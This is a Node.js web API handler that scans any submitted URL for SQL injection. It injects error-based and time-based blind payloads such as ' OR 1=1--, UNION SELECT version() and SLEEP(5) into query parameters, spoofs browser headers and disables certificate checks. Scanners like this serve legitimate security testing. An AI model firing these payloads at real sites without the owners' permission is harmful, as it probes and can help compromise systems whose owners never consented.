const axios = require('axios');
const https = require('https');
const rules = require('../../rules.json');

const axiosInstance = axios.create({
    httpsAgent: new https.Agent({ rejectUnauthorized: false }),
    timeout: 8000,
    headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Referer': 'https://www.google.com/'
    }
});

// 延时函数
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

async function checkTimeBasedInjection(baseUrl, param, payload) {
    const start = Date.now();
    const testUrl = new URL(baseUrl);
    testUrl.searchParams.set(param, payload);
    try {
        await axiosInstance.get(testUrl.href, { timeout: 10000 });
        const elapsed = Date.now() - start;
        // 如果响应时间超过 5 秒，认为可能存在时间盲注
        return elapsed > 5000;
    } catch (e) {
        return false;
    }
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { url } = req.body;
    if (!url) return res.status(400).json({ error: 'Missing url' });

    let targetUrl = url;
    if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;

    const errorPayloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL, version()--",
        "' AND 1=CONVERT(int, @@version)--"
    ];
    const timePayloads = [
        "' AND SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        "' AND 1=IF(1, SLEEP(5), 0)--"
    ];

    for (const param of rules.sqlParams) {
        // 错误注入检测
        for (const payload of errorPayloads) {
            const testUrl = new URL(targetUrl);
            testUrl.searchParams.set(param, payload);
            try {
                const resData = await axiosInstance.get(testUrl.href);
                const errorKeywords = ['sql', 'mysql', 'syntax', 'unclosed', 'warning', 'ora-', 'microsoft ole db'];
                if (errorKeywords.some(k => resData.data.toLowerCase().includes(k))) {
                    return res.json({ vulnerable: true, param, url: testUrl.href, note: 'SQL error detected' });
                }
            } catch (e) {
                if (e.response && e.response.status >= 500) {
                    return res.json({ vulnerable: true, param, url: testUrl.href, note: 'Server error likely caused by injection' });
                }
            }
        }

        // 时间盲注检测（仅测一个 payload，避免超时）
        for (const payload of timePayloads.slice(0, 1)) {
            const isVuln = await checkTimeBasedInjection(targetUrl, param, payload);
            if (isVuln) {
                return res.json({ vulnerable: true, param, url: new URL(targetUrl).href + `?${param}=${encodeURIComponent(payload)}`, note: 'Time-based blind SQL injection detected' });
            }
        }
    }
    res.json({ vulnerable: false });
};
